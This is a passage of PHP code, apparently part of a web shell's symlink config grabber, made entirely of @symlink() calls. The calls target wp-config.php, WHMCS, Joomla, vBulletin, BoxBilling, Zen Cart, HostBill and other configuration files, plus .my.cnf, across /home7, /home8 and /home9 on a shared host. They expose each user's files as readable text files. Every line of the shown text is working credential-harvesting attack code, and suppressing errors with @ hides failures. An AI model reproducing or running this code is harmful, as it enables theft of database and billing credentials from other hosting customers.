@symlink('/home7/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home7/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home7/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home7/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home7/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home7/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home7/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home 8 

@symlink('/home8/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home8/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home8/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home8/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home8/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home8/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home8/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home8/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home8/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home8/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home8/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home8/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home8/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home8/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home 9 

@symlink('/home9/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home9/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home9/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home9/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home9/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home9/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home9/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home9/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
